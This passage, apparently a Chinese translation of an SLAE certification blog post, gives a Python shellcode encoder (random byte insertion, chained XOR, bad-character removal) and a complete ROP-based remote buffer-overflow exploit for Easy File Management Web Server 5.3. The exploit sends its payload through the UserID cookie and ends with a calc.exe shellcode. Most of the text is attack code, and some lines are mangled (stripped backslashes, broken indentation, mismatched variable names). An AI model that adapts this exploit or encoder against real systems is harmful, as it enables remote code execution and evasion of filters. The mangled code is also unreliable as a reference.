        xorArray.append(xor2)
        xorArray.append(xor3)
        return cleanBadChars(byteArray, xorArray, badchars)
    def cleanBadChars(origArray, payload, badchars): 
        for k in badchars: 
            # Ooops, BadChar found :( Do XOR stuff again with a new random value 
            # This could run into an infinite loop in some cases 
            if payload.find(k) >= 0: 
                payload=xorBytes(origArray)
        return payload
    def encodeShellcode (byteArr): 
        shellcode=bytearray() 
        shellcode.extend(byteArr)
        encoded=bytearray()
        tmp=bytearray()
        final=""
        # Check whether shellcode is aligned
        if len(shellcode) % 3 == 1:
        shellcode.append(0x90)
        shellcode.append(0x90)
        elif len(shellcode) % 3 == 2:
            shellcode.append(0x90)
        # Loop to split shellcode into 3-byte-blocks
        for i in range(0,len(shellcode),3): 
            tmp_block=bytearray()
            tmp_block.append(shellcode[i])
            tmp_block.append(shellcode[i+1])
            tmp_block.append(shellcode[i+2])
            # Do the RND-Insertion and chained XORs
            tmp=xorBytes(tmp_block)
            # Some formatting things for easier use in NASM :)
            for y in tmp:
                if len(str(hex(y))) == 3:
                    final+=str(hex(y)[:2]) + "0" + str(hex(y)[2:])+","
            else:
                final+=hex(y)+","
        return final[:-1]
    print "Encoded Shellcode:r" 
    print encodeShellcode(shellcode)
从我的脚本的输出结果中，我们完全找不到这些不可用字符的踪影：
添加解码器之后，这段代码的大小稍微增加了一些：
现在，这段shellcode已经可以在我的[攻击程序](http://www.exploit-db.com/exploits/33610/)中使用了：
    #!/usr/bin/python
    #Exploit Title: Easy File Management Web Server v5.3 - USERID Remote Buffer Overflow (ROP)
    #Version: 5.3
    #Date: 2014-05-31
    #Author: Julien Ahrens (@MrTuxracer)
    #Homepage: http://www.rcesecurity.com
    #Software Link: http://www.efssoft.com/
    #Tested on: WinXP-GER, Win7x64-GER, Win8-EN, Win8x64-GER
    #Credits for vulnerability discovery:
    #superkojiman (http://www.exploit-db.com/exploits/33453/)
    #Howto / Notes:
    #This scripts exploits the buffer overflow vulnerability caused by an oversized UserID - string as
    #discovered by superkojiman. In comparison to superkojiman's exploit, this exploit does not
    #brute force the address of the overwritten stackpart, instead it uses code from its own
    #.text segment to achieve reliable code execution.
    from struct import pack 
    import socket,sys 
    import os
    host="192.168.0.1" 
    port=80
    junk0 = "x90" * 80
    #Instead of bruteforcing the stack address, let's take an address 
    #from the .text segment, which is near to the stackpivot instruction:
    #0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll]
    #The memory located at 0x1001D8F0: "x7AxD8x01x10" does the job!
    #Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
    call_edx=pack('<L',0x1001D8C8)
    junk1="x90" * 280 
    ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]
    #Since 0x00 would break the exploit, the 0x00457452 (JMP ESP [fmws.exe]) needs to be crafted on the stack
    craftedjmpesp=pack('<L',0xA445ABCF)
    test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction
    kungfu=pack('<L',0x10022aac) # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll] kungfu+=pack('<L',0xDEADBEEF) # filler 
    kungfu+=pack('<L',0xDEADBEEF) # filler 
    kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP 
    kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]
    nopsled="x90" * 20
    #windows/exec CMD=calc.exe
    #Encoder: x86/shikataganai
    #powered by Metasploit
    #msfpayload windows/exec CMD=calc.exe R | msfencode -b 'x00x0ax0d'
    shellcode = ("xebx2ax5ex56x89xf7x31xc9x31xd2x8ax06x8ax5ex01x30xd8x88x07x47x46x41x80xf9x03x75xefx46x31xc9x66x83xc2x04x66x81xfax04x01x75xe1xffx14x24xe8xd1xffxffxffxb6x4axa2x20xfdxfdxfdxfdxadxcdx44xa1xc2xf3x33x57x6dxe6xb6x86xffx74x26x2ax41xcax98x8cx75xfex8cxa4x37x38x8fxc5x29x0fx3exc1x69xc5xf9x98x5dx21x23x0fx93xb3x72xbdx3cx31x30xf7x8fx6dx9fxcdx33x64xefxbdx69x79xf2xb8x2ex12x99xd5x89x98xe0x03x50x18x19xc8x80xd1x5ax03x92xb2xb3x60x04x8fxc6xdexc4x27x1dx54xf5x7ex4axc1xc7xc6x10x21x33xccx60xa1x20xefxe2xe3x08xcfxf7x17x46x33xc5xc6xc5xb8x40x7bx4ex33x17x62xdcx38x60xebxaaxf2xd6xd7x61xb2xd4x5fxe0xecxa7x2cx60x38x24x25x01xd2x59x5dx4axc1xc0x10x7fxf6xb2x96xabx8fxd4x8fxe6x87xdex84x7bx2axd5x35xbexe1xbexe4x32xb9xabx40x95x18x45x2fxf3xf2x7fxfax07xb5xb5xb5xe3xe3xb3xdbxfexcfx44x2bxcax4dxb2x67xaex15xe5x50xeax48x1ex76xaex08x9dx20x81x1cxe3x36x29x15x13x6fx24x2exaex55x55xb5xc0xc5x66xddx9ax89x6bx19x76x1cx0fx0fx5cxa3xb3x66x05x64x40x2cx4fx61xa4xc1xb9xdcxc8xc8x58xc8")
    payload=junk0 + calledx + junk1 + ppr + craftedjmpesp + testbl + kungfu + nopsled + shellcode
    buf="GET /vfolder.ghp HTTP/1.1rn" 
    buf+="User-Agent: Mozilla/4.0rn" 
    buf+="Host:" + host + ":" + str(port) + "rn" 
    buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8rn" buf+="Accept-Language: en-usrn" 
    buf+="Accept-Encoding: gzip, deflatern" buf+="Referer: http://" + host + "/rn" 
    buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;rn" 
    buf+="Conection: Keep-Alivernrn"
    print "[*] Connecting to Host " + host + "..."
    s=socket.socket(socket.AFINET, socket.SOCKSTREAM) 
    try: 
        connect=s.connect((host, port)) 
        print "[*] Connected to " + host + "!" 
    except: 
        print "[!] " + host + " didn't respondn" 
        sys.exit(0)
    print "[*] Sending malformed request..." s.send(buf)
    print "[!] Exploit has been sent!n" s.close()
你可以使用Immunity Debugger来跟踪shellcode的解码过程。首先，ESI会再次指向编码后的shellcode：
当“call [esp]”处执行真正的shellcode时，我们可以看到ESP指向的是原始的、解码后的shellcode：
最后，Easy File Management Webserver中会弹出一个calc.exe窗口。
因此，我们顺利完成了另一个SLAE任务！
我之所以写这篇文章，是为了完成SecurityTube Linux汇编专家认证的任务，这个任务链接如下：
[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
对应的Student ID为SLAE- 497。